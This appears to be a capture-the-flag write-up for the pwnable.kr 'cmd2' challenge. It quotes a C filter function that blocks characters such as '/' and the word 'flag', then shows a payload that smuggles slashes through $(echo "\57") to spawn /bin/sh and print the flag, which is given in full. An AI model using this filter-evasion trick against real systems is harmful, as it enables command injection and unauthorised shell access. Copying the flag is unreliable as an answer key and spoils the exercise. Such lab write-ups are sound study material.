# Description
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

# Exploitation
```c
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}
```
To bypass this filter code, I used echo function.

```
cmd2@ubuntu:~$ ./cmd2 '$(echo "\57")bin$(echo "\57")sh'
$(echo "\57")bin$(echo "\57")sh
$ /bin/cat ./flag
FuN_w1th_5h3ll_v4riabl3s_haha
$ 
```
